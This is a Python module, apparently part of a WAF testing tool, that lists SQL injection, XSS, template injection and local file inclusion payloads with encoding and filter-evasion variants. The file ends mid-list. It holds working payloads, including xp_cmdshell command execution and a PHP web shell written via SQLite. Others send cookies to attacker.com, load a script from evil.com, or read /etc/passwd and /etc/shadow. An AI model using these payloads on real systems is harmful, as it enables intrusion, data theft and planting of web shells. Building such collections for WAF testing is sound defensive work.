#!/usr/bin/env python3
"""
Common Attack Vectors

This module contains attack vectors that are common across different WAF products.
These are organized by vulnerability type and can be used for testing any WAF.
"""

class SQLInjectionVectors:
    """SQL injection attack vectors for testing WAF rules."""
    
    # Basic SQL injection patterns
    BASIC = [
        "' OR 1=1 --",
        "' OR '1'='1",
        "1' OR '1'='1",
        "admin' --",
        "admin'/*",
        "' OR 1=1#",
        "') OR ('1'='1",
        "')) OR (('1'='1",
        "' OR '1'='1'--",
        "\" OR \"1\"=\"1",
        "\" OR \"1\"=\"1\"--",
        "\" OR 1=1--",
        "OR 1=1--",
        "' OR 'x'='x",
        "' OR \"1\"=\"1\"--",
        "' UNION SELECT 1, username, password FROM users--",
        "' ORDER BY 10--",
        "UNION SELECT @@version, NULL, NULL--",
        "' HAVING 1=1--"
    ]
    
    # Time-based blind SQL injection
    TIME_BASED = [
        "' WAITFOR DELAY '0:0:5' --",
        "1'; WAITFOR DELAY '0:0:5' --",
        "' SLEEP(5) --",
        "1' AND SLEEP(5) --",
        "' AND IF(1=1, SLEEP(5), 0) --",
        "'; SELECT pg_sleep(5) --",
        "' SELECT BENCHMARK(10000000,MD5('A')) --",
        "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --",
        "' AND (SELECT 6432 FROM (SELECT(SLEEP(5)))a) --"
    ]
    
    # Error-based SQL injection
    ERROR_BASED = [
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",
        "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT DISTINCT CONCAT(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 1),0x7e))s), 8446744073709551610, 8446744073709551610))) --",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e)) --",
        "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,(SELECT VERSION()),0x7e)) USING utf8))) --",
        "' AND (SELECT 8446744073709551610+1) --",
        "' AND (SELECT EXP(~(SELECT * FROM (SELECT CONCAT(0x7e,VERSION(),0x7e))x))) --"
    ]
    
    # Union-based SQL injection
    UNION_BASED = [
        "' UNION SELECT 1,2,3,4 --",
        "' UNION SELECT username, password, 3, 4 FROM users --",
        "' UNION ALL SELECT 1,2,3,4 --",
        "' UNION SELECT NULL, table_name, NULL, NULL FROM information_schema.tables --",
        "' UNION SELECT 1,@@version,3,4 --",
        "' UNION SELECT 1,database(),3,4 --",
        "' UNION SELECT 1,table_name,3,4 FROM information_schema.tables --",
        "' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users' --",
        "' UNION SELECT 1,concat(username,':',password),3,4 FROM users --"
    ]
    
    # Boolean-based blind SQL injection
    BOOLEAN_BASED = [
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "' AND (SELECT 'x' FROM users LIMIT 1)='x' --",
        "' OR (SELECT 'x' FROM users LIMIT 1)='x' --",
        "' AND (SELECT 'x' FROM users WHERE username='admin')='x' --",
        "' AND ASCII(SUBSTRING((SELECT 'admin'),1,1))=97 --",
        "' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1)=97 --"
    ]
    
    # Database specific SQL injection
    DB_SPECIFIC = {
        # MySQL specific vectors
        "MYSQL": [
            "' OR 1=1 -- -",
            "' UNION SELECT @@version, @@version_compile_os, 3, 4 --",
            "' UNION SELECT 1,2,3,4 INTO OUTFILE '/var/www/html/shell.php' --",
            "' OR 1=1 LIMIT 1,1 --",
            "' OR 1=1 PROCEDURE ANALYSE() --",
            "1' AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT user()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e)) --",
            "1' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1) --"
        ],
        # Microsoft SQL Server specific vectors
        "MSSQL": [
            "'; EXEC xp_cmdshell('net user') --",
            "'; EXEC master..xp_cmdshell 'ping 127.0.0.1' --",
            "'; DECLARE @q VARCHAR(8000); SET @q=0x; EXEC(@q) --",
            "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --",
            "'; BACKUP DATABASE master TO DISK='\\\\UNC\\share\\file.bak' --",
            "'; DROP TABLE users --",
            "'; IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '0:0:5' --",
            "'; SELECT * FROM master..sysprocesses --"
        ],
        # PostgreSQL specific vectors
        "POSTGRESQL": [
            "'; SELECT pg_sleep(5) --",
            "'; SELECT current_setting('data_directory') --",
            "'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id' --",
            "'; DO $$ BEGIN PERFORM pg_sleep(5); END $$; --",
            "'; SELECT * FROM pg_user --",
            "'; SELECT * FROM pg_catalog.pg_tables --",
            "'; SELECT pg_read_file('/etc/passwd') --",
            "'; SELECT pg_ls_dir('.') --"
        ],
        # Oracle specific vectors
        "ORACLE": [
            "' OR 1=1 FROM DUAL --",
            "' UNION ALL SELECT NULL, NULL FROM DUAL --",
            "' UNION ALL SELECT table_name, NULL FROM all_tables --",
            "' UNION ALL SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS' --",
            "' UNION ALL SELECT banner, NULL FROM v$version --",
            "' UNION ALL SELECT SYS.DATABASE_NAME, NULL FROM DUAL --",
            "' BEGIN DBMS_LOCK.SLEEP(5); END; --",
            "' SELECT UTL_INADDR.GET_HOST_ADDRESS('google.com') FROM DUAL --"
        ],
        # SQLite specific vectors
        "SQLITE": [
            "' UNION SELECT 1,sqlite_version(),3,4 --",
            "' UNION SELECT 1,name,3,4 FROM sqlite_master --",
            "' UNION SELECT 1,sql,3,4 FROM sqlite_master --",
            "' AND (SELECT count(*) FROM sqlite_master) > 0 --",
            "' ATTACH DATABASE '/var/www/html/shell.php' AS shell; CREATE TABLE shell.pwn (code TEXT); INSERT INTO shell.pwn VALUES ('<?php system($_GET[\"cmd\"]); ?>'); --",
            "' UNION SELECT 1,load_extension('malicious'),3,4 --",
            "' UNION SELECT 1,readfile('/etc/passwd'),3,4 --",
            "' AND 1=randomblob(1000000000) --"
        ]
    }
    
    # Obfuscated SQL injection
    OBFUSCATED = [
        "'+OR+1=1--",
        "%27%20OR%201=1%20--%20",
        "%27%09OR%091=1%09--%09",
        "%27/**/OR/**/1=1/**/--/**/%20",
        "%u0027%u0020OR%u00201=1%u0020--%u0020",
        "' /*!50000OR*/ 1=1 --",
        "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3,4 --",
        "'+UnIoN/**/SeLeCT/**/1,2,3,4--",
        "'%2bOR%2b1=1--",
        "'+/*!50000OR*/+1=1--+",
        "'+OR/**/1=1/**/--/**/"
    ]
    
    # Filter evasion techniques
    FILTER_EVASION = [
        # Case variation
        "' oR 1=1 --",
        "' Or 1=1 --",
        "' OR 1=1/**/--",
        # Whitespace manipulation
        "'OR(1)='1",
        "'OR 1='1",
        "'OR/**/1='1",
        # Comment variation
        "' OR 1=1/* comment */--",
        "/*! ' OR 1=1 */",
        "' OR 1=1 -- comment",
        # Logical equivalents
        "' OR 2>1 --",
        "' OR 'a'!='b' --",
        "' OR 3-2=1 --",
        # String concatenation
        "' OR 'a'||'b'='ab' --",
        "' OR 'a'+'b'='ab' --",
        "' OR CONCAT('a','b')='ab' --",
        # Alternate encodings
        "' OR char(49)=char(49) --",
        "' OR unicode('1')=unicode('1') --",
        "' OR ASCII('1')=ASCII('1') --",
        # NULL byte injection
        "' OR 1=1 %00",
        "1%00' OR '1'='1",
        "1%00' OR 1=1 --"
    ]
    
    # Keyword bypass techniques
    KEYWORD_BYPASS = [
        # OR alternatives
        "' || 1=1 --",
        "' | 1=1 --",
        "' && 1=1 --",
        "' & 1=1 --",
        "' %00 OR 1=1 --",
        # UNION alternatives
        "'; SELE/**/CT 1,2,3,4 --",
        "'; SEL%00ECT 1,2,3,4 --",
        "'; SELECT/*!*/1,2,3,4 --",
        "'; /*!SELECT*/ 1,2,3,4 --",
        # SELECT alternatives
        "1'; (SELECT/**/'x')='x' --",
        "1'; (SEL%00ECT 'x')='x' --",
        # Space and comment alternatives
        "'%09OR%091=1%09--%09",
        "'%0AOR%0A1=1%0A--%0A",
        "'/**_**/OR/**_**/1=1/**_**/--/**_**/"
    ]
    
    @classmethod
    def all(cls) -> list:
        """Return all SQL injection vectors."""
        all_vectors = (
            cls.BASIC +
            cls.TIME_BASED +
            cls.ERROR_BASED +
            cls.UNION_BASED +
            cls.BOOLEAN_BASED +
            cls.OBFUSCATED +
            cls.FILTER_EVASION +
            cls.KEYWORD_BYPASS
        )
        
        # Add database-specific vectors
        for db_vectors in cls.DB_SPECIFIC.values():
            all_vectors.extend(db_vectors)
            
        return all_vectors
    
    @classmethod
    def basic(cls) -> list:
        """Return basic SQL injection vectors."""
        return cls.BASIC
    
    @classmethod
    def advanced(cls) -> list:
        """Return advanced SQL injection vectors."""
        return (
            cls.TIME_BASED +
            cls.ERROR_BASED +
            cls.UNION_BASED +
            cls.BOOLEAN_BASED
        )
    
    @classmethod
    def evasion(cls) -> list:
        """Return SQL injection vectors focused on evasion techniques."""
        return cls.OBFUSCATED + cls.FILTER_EVASION + cls.KEYWORD_BYPASS
    
    @classmethod
    def for_database(cls, database: str) -> list:
        """Return SQL injection vectors specific to a database."""
        db = database.upper()
        if db in cls.DB_SPECIFIC:
            return cls.DB_SPECIFIC[db]
        return []


class XSSVectors:
    """Cross-site scripting attack vectors for testing WAF rules."""
    
    # Basic XSS vectors
    BASIC = [
        "<script>alert(1)</script>",
        "<script>alert(document.cookie)</script>",
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\"></iframe>",
        "<a href=\"javascript:alert(1)\">Click me</a>",
        "<div onclick=\"alert(1)\">Click me</div>",
        "<input value=\"\" autofocus onfocus=\"alert(1)\">"
    ]
    
    # HTML event handlers that can be used for XSS
    EVENT_HANDLERS = [
        "<body onload=alert(1)>",
        "<body onpageshow=alert(1)>",
        "<body onresize=alert(1)>",
        "<body onhashchange=alert(1)><a href=\"#x\">Click me</a>",
        "<body onbeforeunload=alert(1)>",
        "<body onunload=alert(1)>",
        "<body onblur=alert(1)>",
        "<body onfocus=alert(1)>",
        "<body onfocusin=alert(1)>",
        "<body onfocusout=alert(1)>",
        "<input onblur=alert(1) autofocus><input autofocus>",
        "<input onfocus=alert(1) autofocus>",
        "<input onkeydown=alert(1) autofocus>",
        "<input onkeypress=alert(1) autofocus>",
        "<input onkeyup=alert(1) autofocus>",
        "<input onchange=alert(1) autofocus>",
        "<select onchange=alert(1) autofocus>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onload=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<object data=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<iframe onload=alert(1)>",
        "<script onload=alert(1)>",
        "<script onerror=alert(1) src=//evil.com/nonexistent.js>",
        "<marquee onstart=alert(1)>",
        "<div onmouseover=alert(1)>Hover me</div>",
        "<div onmouseout=alert(1)>Hover me</div>",
        "<div onmousedown=alert(1)>Click me</div>",
        "<div onmouseup=alert(1)>Click me</div>",
        "<div onclick=alert(1)>Click me</div>",
        "<div ondblclick=alert(1)>Double click me</div>",
        "<div oncontextmenu=alert(1)>Right click me</div>",
        "<div onauxclick=alert(1)>Middle click me</div>"
    ]
    
    # HTML tag-based XSS
    HTML_TAGS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<iframe src=\"javascript:alert(1)\"></iframe>",
        "<svg><script>alert(1)</script></svg>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<math><maction actiontype=\"statusline#\" xlink:href=\"javascript:alert(1)\">Click me</maction></math>",
        "<form><button formaction=\"javascript:alert(1)\">Click me</button></form>",
        "<isindex type=image src=x onerror=alert(1)>",
        "<input type=\"image\" src=x onerror=alert(1)>",
        "<object data=\"javascript:alert(1)\">",
        "<embed src=\"javascript:alert(1)\">",
        "<svg><set attributeName=\"onload\" to=\"alert(1)\" /></svg>",
        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
        "<link rel=\"stylesheet\" href=\"javascript:alert(1)\">",
        "<table background=\"javascript:alert(1)\"></table>",
        "<div style=\"background-image: url(javascript:alert(1))\"></div>",
        "<marquee behavior=\"alternate\" onstart=\"alert(1)\">XSS</marquee>",
        "<keygen autofocus onfocus=alert(1)>",
        "<video><source onerror=\"alert(1)\">",
        "<audio src=x onerror=alert(1)>",
        "<img srcset=\"1\" onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<meter value=2 min=0 max=10 onmouseover=alert(1)>",
        "<frame src=\"javascript:alert(1)\">",
        "<frameset><frame src=\"javascript:alert(1)\"></frameset>"
    ]
    
    # JavaScript protocol-based XSS
    JS_PROTOCOL = [
        "<a href=\"javascript:alert(1)\">Click me</a>",
        "<a href=\"javascript:alert(document.cookie)\">Click me</a>",
        "<a href=\"javascript:alert(document.domain)\">Click me</a>",
        "<a href=\"javascript:fetch('//attacker.com/'+document.cookie)\">Click me</a>",
        "<a href=\"javascript:eval(atob('YWxlcnQoMSk='))\">Click me</a>",
        "<iframe src=\"javascript:alert(1)\"></iframe>",
        "<object data=\"javascript:alert(1)\"></object>",
        "<embed src=\"javascript:alert(1)\"></embed>",
        "<img src=\"javascript:alert(1)\">",
        "<form action=\"javascript:alert(1)\"><input type=submit>",
        "<button formaction=\"javascript:alert(1)\">Click me</button>",
        "<link rel=\"stylesheet\" href=\"javascript:alert(1)\">",
        "<table background=\"javascript:alert(1)\"></table>",
        "<div style=\"background:url('javascript:alert(1)')\"></div>",
        "<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">Click me</text></a></svg>"
    ]

    # DOM-based XSS
    DOM_BASED = [
        "<script>document.write('<img src=x onerror=alert(1)>');</script>",
        "<script>document.body.innerHTML='<img src=x onerror=alert(1)>';</script>",
        "<script>eval(location.hash.slice(1))</script>#alert(1)",
        "<script>setTimeout('alert(1)',500);</script>",
        "<script>setInterval('alert(1)',500);</script>",
        "<script>new Function('alert(1)')();</script>",
        "<script>fetch('/api' + location.hash);</script>#?secret=1",
        "<script>document.write('<script>alert(1)<\\/script>');</script>",
        "<script>window.onload = function() { eval(location.search.slice(1)) };</script>?alert(1)",
        "<script>var x = document.createElement('script'); x.src='//evil.com/xss.js'; document.head.appendChild(x);</script>"
    ]
    
    # Filter evasion techniques for XSS
    FILTER_EVASION = [
        # Script tag variations
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script >alert(1)</script >",
        "<script/x>alert(1)</script>",
        "<script\x20type=\"text/javascript\">alert(1);</script>",
        "<script\x3Etype=\"text/javascript\">alert(1);</script>",
        "<script\x0Dtype=\"text/javascript\">alert(1);</script>",
        "<script\x09type=\"text/javascript\">alert(1);</script>",
        "<script\x0Ctype=\"text/javascript\">alert(1);</script>",
        "<script\x0Atype=\"text/javascript\">alert(1);</script>",
        
        # Tag splitting
        "<scr<script>ipt>alert(1)</scr<script>ipt>",
        "<<script>alert(1)//<</script>",
        "<scr\0ipt>alert(1)</scr\0ipt>",
        
        # Quotation variations
        "<img src=x onerror='alert(1)'>",
        "<img src=x onerror=\"alert(1)\">",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert`1`>",
        
        # Encoded JavaScript
        "<img src=x onerror=\"eval('aler'+'t(1)')\">",
        "<img src=x onerror=\"\\u0061lert(1)\">",
        "<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">",
        "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
        
        # HTML encoding
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        
        # URL encoding
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
        
        # Double encoding
        "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
        
        # Mixed encoding
        "&#x3C;img src=x onerror=%61%6C%65%72%74%28%31%29>",
        
        # Null bytes
        "<img src=x onerror=alert(1)%00>",
        "<scr%00ipt>alert(1)</scr%00ipt>",
        
        # Alternative syntax
        "expression(alert(1))",
        "expression&#40;alert&#40;1&#41;&#41;",
        "`${alert(1)}`",
        "alert&#96;1&#96;",
        
        # No parentheses
        "<img src=x onerror=\"alert`1`\">",
        "<img src=x onerror=\"window['alert'](1)\">",
        "<img src=x onerror=\"[].constructor.constructor('alert(1)')()\">",
        
        # Vector combinations
        "<iframe src=javascript:eval('\\x61ler\\x74(1)')></iframe>",
        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
        "<svg><script>a='<'</script><script>alert(1)// </script></svg>",
        "<body onload=\"document.write('\\x3C\\x73\\x63\\x72\\x69\\x70\\x74\\x3E\\x61\\x6C\\x65\\x72\\x74\\x28\\x31\\x29\\x3C\\x2F\\x73\\x63\\x72\\x69\\x70\\x74\\x3E')\">",
        "<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>"
    ]
    
    # CSS-based XSS
    CSS_BASED = [
        "<div style=\"background-image: url('javascript:alert(1)')\"></div>",
        "<style>@import 'javascript:alert(1)';</style>",
        "<div style=\"background-image: url(javascript:alert(1))\"></div>",
        "<div style=\"width: expression(alert(1))\"></div>",
        "<style>*{x:expression(alert(1))}</style>",
        "<div style=\"width: expression\\28 alert\\28 1 \\29\\29\"></div>",
        "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}h1:target {background:url('javascript:alert(1)')}</style><h1 id=x style=\"transition:all 10s\">XSS</h1>",
        "<xss style=\"behavior: url(xxx.htc)\"></xss>",
        "<div id=\"test\" style=\"x:\"><script>alert(1)</script></div>",
        "<div style=\"background:url(/f#&#127;oo/;color:red/*/foo.jpg);\">XSS</div>"
    ]
    
    # HTML5-specific XSS vectors
    HTML5 = [
        "<video><source onerror=\"alert(1)\">",
        "<audio src=x onerror=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<video><source onerror=\"javascript:alert(1)\">",
        "<video poster=javascript:alert(1)//>",
        "<math><mi xlink:href=\"data:x,<script>alert(1)</script>\">",
        "<math><mi xlink:href=\"javascript:alert(1)\">CLICK</mi></math>",
        "<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">XSS</text></a></svg>",
        "<svg><animate xlink:href=\"#xss\" attributeName=\"href\" values=\"javascript:alert(1)\"/><a id=\"xss\"><text x=\"20\" y=\"20\">XSS</text></a>",
        "<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>",
        "<input onfocus=alert(1) autofocus>",
        "<keygen autofocus onfocus=alert(1)>",
        "<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>",
        "<marquee onstart=alert(1)>XSS</marquee>",
        "<details open ontoggle=alert(1)>",
        "<summary ontoggle=alert(1)>click</summary>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><discard onbegin=alert(1)>",
        "<canvas id=\"canvas\" width=\"100\" height=\"100\"></canvas><script>var c=document.getElementById(\"canvas\");var ctx=c.getContext(\"2d\");ctx.fillText(\"XSS\",0,50);var img=new Image();img.src=c.toDataURL();document.write(img.src);</script>",
        "<svg><set attributeName=\"onload\" to=\"alert(1)\" /></svg>"
    ]
    
    # AngularJS-specific XSS vectors
    ANGULAR = [
        "{{constructor.constructor('alert(1)')()}}",
        "<div ng-app ng-csp><div ng-click=\"$event.view.alert(1)\">click me</div></div>",
        "<div ng-app ng-csp><div ng-click=\"$event.preventDefault();$event.view.alert(1)\">click me</div></div>",
        "<div ng-app ng-csp><input autofocus ng-focus=\"$event.path[0].ownerDocument.defaultView.alert(1)\"></div>",
        "<div ng-app ng-csp ng-focus=\"$event.path[0].ownerDocument.defaultView.alert(1)\">focus me</div>",
        "<div ng-app ng-csp ng-click=\"$event.view.{{constructor.constructor('alert(1)')()}}\">click me</div>",
        "<div ng-app ng-csp ng-click=\"$event.view.{{constructor.constructor.prototype.constructor('alert(1)')()}}\">click me</div>",
        "<div ng-app ng-csp><div ng-click=\"this.constructor.constructor('alert(1)')();\">click me</div></div>",
        "<div ng-app ng-csp><div ng-click=\"this['constructor']['constructor']('alert(1)')();\">click me</div></div>",
        "<div ng-app ng-csp><form ng-attr-action=\"data:application/javascript,alert(1)\" ng-submit=\"true\"><input type=\"submit\">click me</form></div>"
    ]
    
    # Markdown-based XSS (for platforms that convert Markdown to HTML)
    MARKDOWN = [
        "[XSS](javascript:alert(1))",
        "[XSS](javascript&colon;alert(1))",
        "[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
        "[XSS](data:text/html,<script>alert(1)</script>)",
        "[XSS](JaVaScRiPt:alert(1))",
        "[a](javascript:prompt(document.cookie))",
        "[a](j a v a s c r i p t:alert(1))",
        "[click me](javascript:alert('XSS'))",
        "![image](javascript:alert('XSS'))",
        "![image](data:image/svg+xml,<svg onload=alert(1)>)",
        "[XSS](vbscript:alert(1))",
        "[XSS](javascript&Tab;:alert(1))",
        "[XSS](javascript&NewLine;:alert(1))",
        "[XSS](javascript&colon;&lpar;alert&lpar;1&rpar;&rpar;)",
        "[XSS](<javascript:alert(1)>)"
    ]
    
    # Template injection (for template engines like Jinja2, Handlebars, etc.)
    TEMPLATE_INJECTION = [
        "${alert(1)}",
        "#{alert(1)}",
        "{{alert(1)}}",
        "{{constructor.constructor('alert(1)')()}}",
        "{{{constructor.constructor('alert(1)')()}}}",
        "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}",
        "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor)}}",
        "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'alert(1)'}}",
        "{{{}['__proto__']['__proto__'].constructor.constructor('alert(1)')()}}",
        "{{ \"\".__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",  # Python/Jinja2 specific
        "<%= 7 * 7 %>",  # EJS/ERB
        "<%= system('cat /etc/passwd') %>",  # Ruby/ERB specific
        "{{range.constructor(\"return self.process.mainModule.require('child_process').execSync('cat /etc/passwd')\")()}}",  # Node.js/Handlebars specific
        "{{\"x\".constructor.prototype.charAt=[].join;$eval(\"x\".constructor.prototype.charAt.call(({}),$get.target.constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41,59)))}}",
        "{{3*3}}[[5*5]]",
        "{{alert(1)}}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"cat /etc/passwd\")}",  # FreeMarker specific
        "#evaluate( $is_true=$is_false.getClass().forName('java.lang.Runtime').getRuntime().exec('id') )",  # Velocity specific
        "}}{{%25x: alert(1)x%25}}"  # Twig specific
    ]
    
    @classmethod
    def all(cls) -> list:
        """Return all XSS vectors."""
        return (
            cls.BASIC +
            cls.EVENT_HANDLERS +
            cls.HTML_TAGS +
            cls.JS_PROTOCOL +
            cls.DOM_BASED +
            cls.FILTER_EVASION +
            cls.CSS_BASED +
            cls.HTML5 +
            cls.ANGULAR +
            cls.MARKDOWN +
            cls.TEMPLATE_INJECTION
        )
    
    @classmethod
    def basic(cls) -> list:
        """Return basic XSS vectors."""
        return cls.BASIC
    
    @classmethod
    def advanced(cls) -> list:
        """Return advanced XSS vectors."""
        return (
            cls.EVENT_HANDLERS +
            cls.HTML_TAGS +
            cls.JS_PROTOCOL +
            cls.DOM_BASED +
            cls.CSS_BASED +
            cls.HTML5
        )
    
    @classmethod
    def evasion(cls) -> list:
        """Return XSS vectors focused on evasion techniques."""
        return cls.FILTER_EVASION
    
    @classmethod
    def framework_specific(cls, framework: str) -> list:
        """Return XSS vectors specific to a framework."""
        framework = framework.lower()
        if framework == "angular" or framework == "angularjs":
            return cls.ANGULAR
        elif framework == "markdown":
            return cls.MARKDOWN
        elif framework == "template" or framework == "templates":
            return cls.TEMPLATE_INJECTION
        return []


class LFIVectors:
    """Local File Inclusion attack vectors for testing WAF rules."""
    
    # Basic LFI vectors
    BASIC = [
        "../../../etc/passwd",
        "../../../etc/hosts",
        "../../../windows/win.ini",
        "../../../boot.ini",
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd",
        "../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../../../../../../../etc/passwd",
        "../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/stat",
        "/proc/self/status",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/proc/self/fd/3",
        "/etc/issue",
        "/etc/motd",
        "/etc/fstab",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/error_log",
        "/var/www/html/index.php",
        "/var/www/html/wp-config.php",
        "/etc/httpd/logs/access_log",
        "/etc/httpd/logs/error_log",
        "/usr/local/apache/conf/httpd.conf",
        "/etc/apache2/apache2.conf",
        "/etc/nginx/nginx.conf",
        "/etc/nginx/sites-available/default",
        "/var/mysql/mysql.sock",
        "/var/lib/mysql/mysql.sock",
        "/tmp/sess_*",
        "/tmp/sessions/*",
        "/boot.ini",
        "/windows/win.ini",
        "/windows/system.ini",
        "C:/windows/win.ini",
        "C:/windows/system.ini",
        "C:/boot.ini",
        "C:/winnt/win.ini",
        "C:/winnt/system.ini",
        "C:/Program Files/Apache Group/Apache/conf/httpd.conf",
        "C:/Program Files/Apache Group/Apache2/conf/httpd.conf",
        "C:/xampp/apache/conf/httpd.conf",
        "C:/xampp/FileZillaFTP/FileZilla Server.xml"
    ]
    
    # Path traversal encoding and variations
    ENCODING = [
        # URL encoding
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",  # Double encoding
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",  # Overlong UTF-8 encoding
        "%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8fetc%ef%bc%8fpasswd",  # Fullwidth encoding
        
        # Null byte injection
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.html",
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd\u0000",
        "../../../etc/passwd\x00",
        
        # Directory separator variations
        "..///..///..///etc///passwd",
        "..\\..\\..\\windows\\win.ini",
        "../\\.\\./\\../etc/passwd",
        "..//../..///..////etc/passwd",
        "..\\/..\\/..\\/etc\\/passwd",
        "...//...//...//etc//passwd",
        
        # Mixed encoding
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%255c..%255c..%255cwindows%255cwin.ini",
        "../\u2215../\u2215../\u2215etc/passwd",  # Unicode division slash
        
        # Path normalization
        "./../../etc/passwd",
        "./../../../etc/passwd",
        "/etc/../etc/../etc/passwd",
        "../../.././././../etc/passwd",
        "././././../../../../etc/passwd",
        "../../../../../../../../../../etc/./passwd",
        "../../../../../../../etc/passwd/..",
        
        # Alternative representations
        "....//....//....//etc//passwd",
        "....\\\\....\\\\....\\\\windows\\\\win.ini",
        ".../.../.../etc/passwd",
        ".../.../.../.../etc/passwd",
        "..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\\\\\.\\\\windows\\\\system32\\\\cmd.exe",
        "///.////.////.//..////..////etc/passwd",
        
        # Unicode normalization
        "../\u0117\u0116\u010C/passwd",
        "..\\/\u0117\u0116\u010C/passwd",
        "..\\/.\\/\u0117\u0116\u010C/passwd"
    ]
    
    # PHP-specific wrappers and filters
    PHP_WRAPPERS = [
        "php://filter/resource=../../../etc/passwd",
        "php://filter/convert.base64-encode/resource=../../../etc/passwd",
        "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/convert.base64-decode/resource=../../../etc/passwd",
        "php://filter/zlib.deflate/resource=../../../etc/passwd",
        "php://filter/zlib.inflate/resource=../../../etc/passwd",
        "php://filter/bzip2.compress/resource=../../../etc/passwd",
        "php://filter/bzip2.decompress/resource=../../../etc/passwd",
        "php://input",
        "php://stdin",
        "php://memory",
        "php://temp",
